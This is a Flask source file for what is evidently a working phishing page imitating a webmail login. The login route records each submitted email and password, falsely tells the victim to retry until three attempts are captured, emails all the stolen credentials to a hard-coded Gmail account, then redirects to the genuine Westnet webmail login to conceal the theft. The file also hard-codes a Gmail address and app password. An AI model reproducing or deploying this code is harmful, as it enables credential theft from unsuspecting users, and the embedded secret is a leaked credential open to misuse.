from flask import Flask, render_template, request, redirect, url_for, flash, session
from flask_mail import Mail, Message
import logging

# Configure logging
logging.basicConfig(level=logging.DEBUG)

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your_secret_key_here'

# Configure mail (SMTP settings for Gmail as example)
app.config['MAIL_SERVER'] = 'smtp.gmail.com'
app.config['MAIL_PORT'] = 587
app.config['MAIL_USE_TLS'] = True
app.config['MAIL_USERNAME'] = 'matthewtownsend451@gmail.com'  # Your Gmail address
app.config['MAIL_PASSWORD'] = 'qruoyvpfmufpotvj'  # Your Gmail password or App Password

mail = Mail(app)


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email', '')
    password = request.form.get('password', '')

    # Initialize session storage
    if 'attempts' not in session:
        session['attempts'] = 0
        session['creds'] = []   # list to store all attempts

    # Increase attempts and store credentials
    session['attempts'] += 1
    session['creds'].append({"email": email, "password": password})

    # If attempts < 3 → reload login page
    if session['attempts'] < 3:
        flash(f"Attempt {session['attempts']} of 3. Please try again.", "warning")
        return render_template('index.html')

    # On 3rd attempt → send all attempts via SMTP
    all_attempts_text = "\n\n".join(
        [f"Attempt {i+1}:\nEmail: {c['email']}\nPassword: {c['password']}"
         for i, c in enumerate(session['creds'])]
    )

    message_body = f"Login Attempts (Total: {session['attempts']}):\n\n{all_attempts_text}"

    try:
        msg = Message(
            subject="Login Attempts Report",
            sender=app.config['MAIL_USERNAME'],
            recipients=[app.config['MAIL_USERNAME']],  # Send to yourself (or add more)
            body=message_body
        )
        mail.send(msg)
        flash("Attempts sent via email.", "success")
    except Exception as e:
        flash(f"Failed to send email: {str(e)}", "danger")

    # Reset session after sending
    session.pop('attempts', None)
    session.pop('creds', None)

    # Redirect after sending
    return redirect("https://webmail.westnet.com.au/login?redirectTo=/app/mail")  # final destination


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
